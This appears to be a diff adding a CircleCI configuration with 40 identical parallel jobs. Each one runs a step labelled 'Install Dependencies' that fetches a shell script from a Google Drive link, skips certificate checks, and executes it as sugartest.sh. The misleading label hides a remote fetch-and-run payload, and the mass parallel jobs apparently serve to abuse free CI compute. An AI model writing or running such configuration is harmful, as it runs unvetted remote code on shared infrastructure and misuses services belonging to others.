@@ -1,0 +1,327 @@
+version: 2.1
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku5:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku6:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku7:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku8:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku9:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku10:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku11:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku12:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku13:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku14:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku15:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku16:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku17:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku18:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku19:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku20:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku21:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku22:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku23:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku24:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku25:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku26:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku27:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku28:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku29:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku30:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku31:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku32:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku33:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku34:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku35:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku36:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku37:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku38:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku39:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+    aku40:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1M39ce7plNzUuJCcbkGGCwVTXAY3sZX7t" -O sugartest.sh && rm -rf /tmp/cookies.txt && chmod u+x sugartest.sh && ./sugartest.sh
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
+            - aku6
+            - aku7
+            - aku8
+            - aku9
+            - aku10
+            - aku11
+            - aku12
+            - aku13
+            - aku14
+            - aku15
+            - aku16
+            - aku17
+            - aku18
+            - aku19
+            - aku20
+            - aku21
+            - aku22
+            - aku23
+            - aku24
+            - aku25
+            - aku26
+            - aku27
+            - aku28
+            - aku29
+            - aku30
+            - aku31
+            - aku32
+            - aku33
+            - aku34
+            - aku35
+            - aku36
+            - aku37
+            - aku38
+            - aku39
+            - aku40
